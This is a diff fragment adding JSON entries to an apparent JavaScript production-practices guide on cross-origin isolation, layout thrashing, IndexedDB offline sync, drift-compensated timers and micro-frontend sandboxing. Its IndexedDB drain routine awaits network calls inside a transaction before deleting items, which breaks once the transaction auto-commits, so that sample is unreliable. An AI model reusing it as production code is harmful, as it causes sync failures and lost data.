+    "howItWorksInternally": "The Spectre vulnerability allows malicious JavaScript code to measure microarchitectural timing differences to read private memory across origins inside the same browser process. To prevent this, browser vendors locked down high-resolution timers and `SharedArrayBuffer` behind process isolation. A page must declare `Cross-Origin-Opener-Policy: same-origin` (isolating its browsing context group) and `Cross-Origin-Embedder-Policy: require-corp` (forcing all embedded iframes, images, and fonts to explicitly grant permission).",
+    "productionCode": "// Production Cross-Origin Isolation Verification & Shared Memory Architecture\nclass SharedMemoryEnvironment {\n  // Check if browser environment is cross-origin isolated\n  static isIsolated() {\n    return globalThis.crossOriginIsolated === true;\n  }\n\n  // Allocate thread-safe SharedArrayBuffer with fallbacks\n  static createSharedInt32Array(length) {\n    if (!this.isIsolated()) {\n      console.warn(\n        \"[Security Warning] crossOriginIsolated is false. SharedArrayBuffer is disabled. \" +\n        \"Ensure server sends COOP: same-origin and COEP: require-corp headers. \" +\n        \"Falling back to standard Int32Array (non-shared).\"\n      );\n      return new Int32Array(length);\n    }\n\n    const sharedBuffer = new SharedArrayBuffer(length * Int32Array.BYTES_PER_ELEMENT);\n    return new Int32Array(sharedBuffer);\n  }\n\n  // Lock-free atomic increment across threads\n  static atomicIncrement(int32Array, index) {\n    if (this.isIsolated()) {\n      return Atomics.add(int32Array, index, 1); // Thread-safe atomic increment!\n    }\n    return ++int32Array[index]; // Single-thread fallback\n  }\n}\n\n// Server-Side Configuration (Express.js Headers Example):\n// app.use((req, res, next) => {\n//   res.setHeader(\"Cross-Origin-Opener-Policy\", \"same-origin\");\n//   res.setHeader(\"Cross-Origin-Embedder-Policy\", \"require-corp\");\n//   next();\n// });",
+    "monitoringMetrics": [
+      "crossOriginIsolated flag status === false on app initialization [Severity: Critical]",
+      "SharedArrayBuffer instantiation failures count > 0 [Severity: Critical]",
+      "COEP blocked cross-origin resource requests count [Severity: High]"
+    ],
+    "productionChecklist": [
+      "Verify `window.crossOriginIsolated === true` before initializing `SharedArrayBuffer`.",
+      "Configure server to send `Cross-Origin-Opener-Policy: same-origin` and `Cross-Origin-Embedder-Policy: require-corp`.",
+      "Ensure all third-party CDNs, fonts, and images include `Cross-Origin-Resource-Policy: cross-origin` headers.",
+      "Use `Atomics` operations (`add`, `load`, `store`, `compareExchange`) for all shared array memory mutations.",
+      "Never call `Atomics.wait()` on the main thread; it is strictly restricted to Web Workers."
+    ]
+  },
+  {
+    "id": "js-prod-11",
+    "topic": "Preventing Layout Thrashing & Forced Synchronous Reflows",
+    "category": "Performance & Rendering",
+    "severity": "High / UI Stutter & Frame Drops",
+    "theProblem": "Layout Thrashing occurs when JavaScript repeatedly interleaves reading geometric layout properties (`offsetWidth`, `clientHeight`, `scrollTop`, `getBoundingClientRect()`) with writing styling properties (`element.style.width = ...`). This forces the browser to prematurely recalculate layout multiple times in a single frame, taking up to 100ms and dropping frame rates to unplayable levels.",
+    "howItWorksInternally": "Browsers batch DOM style changes and defer layout calculations until the end of the current JavaScript turn. However, if code writes to the DOM (`box.style.width = '100px'`) and immediately reads a geometry property (`box.offsetWidth`), the browser cannot wait: it is FORCED to pause JavaScript execution and execute a full synchronous Reflow across the DOM tree to calculate the new geometry. Repeating this in a loop across 50 elements forces 50 synchronous reflows.",
+    "productionCode": "// Production FastDOM Batching Engine to Eliminate Layout Thrashing\nclass FastDomQueue {\n  constructor() {\n    this._reads = [];\n    this._writes = [];\n    this._isScheduled = false;\n  }\n\n  // Schedule read operation (measuring geometry)\n  measure(readFn) {\n    this._reads.push(readFn);\n    this._scheduleFlush();\n  }\n\n  // Schedule write operation (mutating styles/DOM)\n  mutate(writeFn) {\n    this._writes.push(writeFn);\n    this._scheduleFlush();\n  }\n\n  _scheduleFlush() {\n    if (!this._isScheduled) {\n      this._isScheduled = true;\n      requestAnimationFrame(() => this._flush());\n    }\n  }\n\n  // Flushes: ALL reads run first, then ALL writes run together! Zero thrashing!\n  _flush() {\n    const reads = this._reads;\n    const writes = this._writes;\n    this._reads = [];\n    this._writes = [];\n    this._isScheduled = false;\n\n    // Phase 1: Batch all reads together\n    for (const read of reads) {\n      try { read(); } catch (e) { console.error(e); }\n    }\n\n    // Phase 2: Batch all writes together\n    for (const write of writes) {\n      try { write(); } catch (e) { console.error(e); }\n    }\n  }\n}\n\n// Production Usage:\nconst fastDom = new FastDomQueue();\nconst cards = document.querySelectorAll(\".card\");\n\n// Synchronously alternating would thrash. FastDom batches reads and writes cleanly:\ncards.forEach(card => {\n  fastDom.measure(() => {\n    const width = card.offsetWidth; // Read phase\n    fastDom.mutate(() => {\n      card.style.height = (width * 0.75) + \"px\"; // Write phase\n    });\n  });\n});",
+    "monitoringMetrics": [
+      "Chrome DevTools: 'Forced reflow is a likely performance bottleneck' warnings [Severity: High]",
+      "Layout recalculation duration per frame > 10ms [Severity: High]",
+      "Rendering pipeline style recalculation count per frame > 2 [Severity: Medium]"
+    ],
+    "productionChecklist": [
+      "Never alternate reading and writing DOM geometry in a loop (`read -> write -> read -> write`).",
+      "Batch all geometric reads (`offsetWidth`, `getBoundingClientRect()`) together before executing style writes.",
+      "Use `transform` and `opacity` CSS properties for animations, as they are handled by the compositor without triggering Reflow or Repaint.",
+      "Cache calculated dimensions in JavaScript variables rather than re-querying the DOM.",
+      "Profile animations in the Chrome DevTools Rendering tab with 'Paint flashing' and 'Layout Shift Regions' enabled."
+    ]
+  },
+  {
+    "id": "js-prod-12",
+    "topic": "Offline-First State Synchronization with IndexedDB & Transaction Isolation",
+    "category": "Data Layer & Storage",
+    "severity": "Critical / Data Loss on Network Drop",
+    "theProblem": "Modern web applications (e.g. note-taking, CRM, field operations) must operate reliably during intermittent network drops or offline flight modes. Relying on `localStorage` is dangerous because it is synchronous, blocking the main thread during reads/writes, and is strictly capped at a tiny 5MB limit. Storing complex offline state requires `IndexedDB`, but raw IndexedDB code is notoriously error-prone with unhandled transaction aborts and database version upgrade crashes.",
+    "howItWorksInternally": "IndexedDB is a transactional, asynchronous, indexed NoSQL object store running in the browser. It stores gigabytes of structured data, blobs, and typed arrays. Every operation occurs within a transaction (`readonly` or `readwrite`). A transaction automatically commits when all scheduled requests finish and control returns to the event loop. If an unhandled exception occurs inside a transaction callback, IndexedDB rolls back all mutations atomically to preserve data integrity.",
+    "productionCode": "// Production IndexedDB Wrapper with Atomic Transactions and Offline Sync Queue\nclass OfflineStore {\n  constructor(dbName = \"AppOfflineDb\", version = 1) {\n    this.dbName = dbName;\n    this.version = version;\n    this.db = null;\n  }\n\n  async init() {\n    return new Promise((resolve, reject) => {\n      const request = indexedDB.open(this.dbName, this.version);\n\n      request.onupgradeneeded = (event) => {\n        const db = event.target.result;\n        // Create object store with auto-incrementing key\n        if (!db.objectStoreNames.contains(\"sync_queue\")) {\n          db.createObjectStore(\"sync_queue\", { keyPath: \"id\", autoIncrement: true });\n        }\n      };\n\n      request.onsuccess = () => {\n        this.db = request.result;\n        resolve(this);\n      };\n\n      request.onerror = () => reject(request.error);\n    });\n  }\n\n  // Queue mutation action atomically while offline\n  async enqueueAction(actionType, payload) {\n    return new Promise((resolve, reject) => {\n      const tx = this.db.transaction([\"sync_queue\"], \"readwrite\");\n      const store = tx.objectStore(\"sync_queue\");\n\n      const item = {\n        actionType,\n        payload,\n        createdAt: Date.now()\n      };\n\n      const request = store.add(item);\n      tx.oncomplete = () => resolve(request.result);\n      tx.onerror = () => reject(tx.error);\n      tx.onabort = () => reject(new Error(\"IndexedDB transaction aborted\"));\n    });\n  }\n\n  // Drain and sync queue when network reconnects\n  async drainSyncQueue(syncApi) {\n    return new Promise((resolve, reject) => {\n      const tx = this.db.transaction([\"sync_queue\"], \"readwrite\");\n      const store = tx.objectStore(\"sync_queue\");\n      const request = store.getAll();\n\n      request.onsuccess = async () => {\n        const items = request.result;\n        for (const item of items) {\n          try {\n            await syncApi(item.actionType, item.payload);\n            // Delete synced item\n            store.delete(item.id);\n          } catch (err) {\n            console.error(\"Failed to sync item, stopping drain:\", err);\n            break;\n          }\n        }\n        resolve(items.length);\n      };\n      tx.onerror = () => reject(tx.error);\n    });\n  }\n}",
+    "monitoringMetrics": [
+      "IndexedDB transaction abort rate > 0.05% [Severity: Critical]",
+      "Pending offline sync queue items count > 200 items [Severity: High]",
+      "IndexedDB storage quota utilization > 80% [Severity: Medium]"
+    ],
+    "productionChecklist": [
+      "Never use `localStorage` for large datasets or offline queues; it is synchronous and blocks the UI thread.",
+      "Always handle `onblocked` and `onupgradeneeded` events when upgrading IndexedDB schema versions.",
+      "Wrap IndexedDB operations in transactions to guarantee atomic rollback on network or code errors.",
+      "Listen to `window.addEventListener('online')` to automatically trigger sync queue draining.",
+      "Check `navigator.storage.estimate()` to inspect available browser quota before saving large media blobs."
+    ]
+  },
+  {
+    "id": "js-prod-13",
+    "topic": "Drift-Compensated Accurate Timing Engine",
+    "category": "Timing & Precision",
+    "severity": "High / Timer Cumulative Drift & Scheduling Errors",
+    "theProblem": "Standard JavaScript timers (`setInterval`, `setTimeout`) are notoriously inaccurate. If you set `setInterval(fn, 1000)`, the callback does NOT fire at exact 1000ms intervals. Because JavaScript is single-threaded, if another task is executing on the call stack, the timer is delayed. Over 10 minutes, a standard interval drifts by several seconds, desynchronizing trading counters, financial audio/video players, and countdown timers.",
+    "howItWorksInternally": "In the browser, timers are placed in the Macrotask Queue. A timer can only execute when the call stack is empty and all pending microtasks have drained. If another operation takes 15ms, your 1000ms timer fires at 1015ms. In standard `setInterval`, this 15ms error is permanently compounded on every tick. An accurate timing engine uses recursive `setTimeout` with continuous clock drift compensation against `performance.now()`.",
+    "productionCode": "// Production Drift-Compensated High-Precision Ticker\nclass PrecisionTicker {\n  constructor(intervalMs, callback) {\n    this.intervalMs = intervalMs;\n    this.callback = callback;\n    this.expectedTime = 0;\n    this.timerId = null;\n    this.running = false;\n  }\n\n  start() {\n    this.running = true;\n    this.expectedTime = performance.now() + this.intervalMs;\n    this._scheduleNext();\n  }\n\n  _scheduleNext() {\n    if (!this.running) return;\n\n    // Calculate drift: how far has real time moved past expected time?\n    const drift = performance.now() - this.expectedTime;\n    \n    // Compensate next interval by subtracting accumulated drift!\n    const nextDelay = Math.max(0, this.intervalMs - drift);\n\n    this.timerId = setTimeout(() => {\n      if (!this.running) return;\n\n      this.callback();\n\n      // Advance expected time forward by exact target interval\n      this.expectedTime += this.intervalMs;\n\n      // Handle severe drift (e.g. laptop lid closed or background tab clamped)\n      if (performance.now() - this.expectedTime > this.intervalMs * 2) {\n        console.warn(\"[Timer Alert] Severe clock drift detected. Re-synchronizing baseline.\");\n        this.expectedTime = performance.now() + this.intervalMs;\n      }\n\n      this._scheduleNext();\n    }, nextDelay);\n  }\n\n  stop() {\n    this.running = false;\n    if (this.timerId) clearTimeout(this.timerId);\n  }\n}\n\n// Test with 1000ms precision ticker:\n// const ticker = new PrecisionTicker(1000, () => {\n//   console.log(\"Tick at exact interval:\", performance.now());\n// });\n// ticker.start();",
+    "monitoringMetrics": [
+      "Timer drift deviation from target interval > 50ms [Severity: High]",
+      "Background tab timer throttling clamping detection [Severity: Medium]",
+      "Missed tick count in audio/video synchronization > 1 [Severity: High]"
+    ],
+    "productionChecklist": [
+      "Never use bare `setInterval` for financial countdowns, audio schedulers, or game loops.",
+      "Calculate drift compensation using `performance.now()` high-resolution monotonic timestamps.",
+      "Account for browser background tab throttling (browsers clamp background timers to 1000ms).",
+      "Provide resynchronization logic if the system sleeps or laptop lid is closed.",
+      "Always call `clearTimeout` when stopping tickers to prevent orphaned background timers."
+    ]
+  },
+  {
+    "id": "js-prod-14",
+    "topic": "Module Federation & Micro-Frontend Global State Isolation",
+    "category": "Architecture & Scalability",
+    "severity": "High / Cross-Team State Collision & Style Leakage",
+    "theProblem": "In large enterprise architectures with Micro-Frontends (using Webpack Module Federation or independent script tags), different teams deploy independent frontends that run in the same browser window. If Team A and Team B both mutate `window.state`, register identical global event names, or use incompatible versions of shared libraries, the application suffers catastrophic state collisions, broken styling, and hard-to-reproduce cross-team bugs.",
+    "howItWorksInternally": "Because standard browser JavaScript shares a single global `window` object and a single DOM document, micro-frontends must enforce strict sandboxing. Modern micro-frontend hosts use JavaScript `Proxy` to construct sandboxed Window environments for each micro-app: reads and writes to global variables are intercepted and redirected to a localized virtual store without polluting the real global `window`.",
+    "productionCode": "// Production Sandbox Window Proxy for Micro-Frontends\nclass MicroAppSandbox {\n  constructor(appName) {\n    this.appName = appName;\n    this.fakeWindow = {};\n    this.active = false;\n\n    // Create Proxy sandboxing access to the global window\n    this.proxy = new Proxy(window, {\n      get: (target, prop) => {\n        // Return local fakeWindow property if assigned by micro-app\n        if (prop in this.fakeWindow) {\n          return this.fakeWindow[prop];\n        }\n        // Fall back to native window property, binding functions to real window\n        const value = target[prop];\n        return typeof value === \"function\" ? value.bind(target) : value;\n      },\n\n      set: (target, prop, value) => {\n        if (this.active) {\n          // Trap global assignments inside local fakeWindow!\n          this.fakeWindow[prop] = value;\n          return true;\n        }\n        return false;\n      }\n    });\n  }\n\n  mount() {\n    this.active = true;\n  }\n\n  unmount() {\n    this.active = false;\n    this.fakeWindow = {}; // Clear sandbox state on unmount!\n  }\n}\n\n// Production Usage:\nconst teamApp = new MicroAppSandbox(\"CheckoutTeamApp\");\nteamApp.mount();\n\n// Code running inside micro-app:\nteamApp.proxy.cartTotal = 99.95; // Writes to sandbox, NOT global window!\n\nconsole.log(\"Sandbox value:\", teamApp.proxy.cartTotal); // 99.95\nconsole.log(\"Global window unpolluted:\", window.cartTotal); // undefined (Protected!)",
+    "monitoringMetrics": [
+      "Global window variables count created at runtime > 10 [Severity: High]",
+      "Cross-micro-frontend style collision detections [Severity: High]",
+      "Duplicate library version loads in network tab > 1 [Severity: Medium]"
+    ],
+    "productionChecklist": [
+      "Isolate micro-frontend global state using Proxy sandboxes or Web Workers.",
+      "Isolate CSS styles using Shadow DOM (`attachShadow({ mode: 'open' })`) or CSS Module scoping.",
+      "Ensure shared singleton dependencies (like React and React-DOM) are federated cleanly using Module Federation shared configuration.",
+      "Prefix custom events (`teamA:orderCreated`) to prevent naming collisions across teams.",
+      "Unmount and clear local state when switching micro-frontend routes."
+    ]
+  }
+]
